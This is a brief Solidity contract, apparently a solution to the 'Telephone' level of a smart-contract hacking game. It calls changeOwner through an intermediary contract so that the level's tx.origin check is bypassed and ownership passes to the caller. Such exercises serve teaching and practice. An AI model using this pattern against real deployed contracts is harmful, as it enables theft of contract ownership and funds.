// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Telephone} from "../levels/Telephone.sol";

contract TelephoneAttack {

    constructor(){

    }
    function attack(Telephone t) public {
        t.changeOwner(msg.sender);
    }
}
